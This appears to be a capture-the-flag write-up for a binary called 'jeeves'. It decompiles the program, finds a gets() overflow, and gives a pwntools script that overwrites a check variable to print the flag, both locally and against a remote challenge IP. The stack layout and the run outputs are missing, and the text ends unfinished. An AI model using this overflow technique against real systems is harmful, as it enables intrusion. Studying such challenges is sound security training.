We're working wit a x64 which has all protection enabled except canary

I'll run it to know what it does

```

└─$ ./jeeves
Hello, good sir!
May I have your name? pwner
Hello pwner, hope you have a good day!
```

Nothing much happening 

I'll decompile using ghidra

Here's the decompiled main function 

```

undefined8 main(void)

{
  char local_48 [44];
  int local_1c;
  void *local_18;
  int local_c;
  
  local_c = -0x21523f2d;
  printf("Hello, good sir!\nMay I have your name? ");
  gets(local_48);
  printf("Hello %s, hope you have a good day!\n",local_48);
  if (local_c == 0x1337bab3) {
    local_18 = malloc(0x100);
    local_1c = open("flag.txt",0);
    read(local_1c,local_18,0x100);
    printf("Pleased to make your acquaintance. Here\'s a small gift: %s\n",local_18);
    close(local_1c);
  }
  return 0;
}
```

From this we can see whats happening

```
1. It saves a value in local_c which when decoded gives deadc0d3
2. It asks for input
3. Uses get to receive our input and stored in local_48
4. Does an if check to compare the value in local_c with 0x1337bab3
5. If the check is meet it open the flag.txt file and prints it out
6. Else it exits
```

With this we know that this is a variable overwrite chall

Here's the stack layout

                                                                                          _start:00101121(*), 001020c8, 
                                                                                          00102170(*)  
 ```
 
 We see the offset of our input starts at `0x48` and the local_c variable is at offset 0xc
 
 So the offset between the input and the check variable is `0x48 - 0xc = 0x3c`
 
 Now with this we can make the exploit 
 
 Here's the script
 
 ```
 from pwn import *

io = process('./jeeves')

payload = ""
payload += "A"*0x3c
payload += p64(0x1337bab3)

io.sendline(payload)
io.interactive()
```

On running it

```

```

It works so i'll run it on the remote server

Here's the modified exploit

```
from pwn import *

io = remote('178.128.160.182',31172)
#io = process('./jeeves')

payload = ""
payload += "A"*0x3c
payload += p64(0x1337bab3)

io.sendline(payload)
io.interactive()
```

On running it
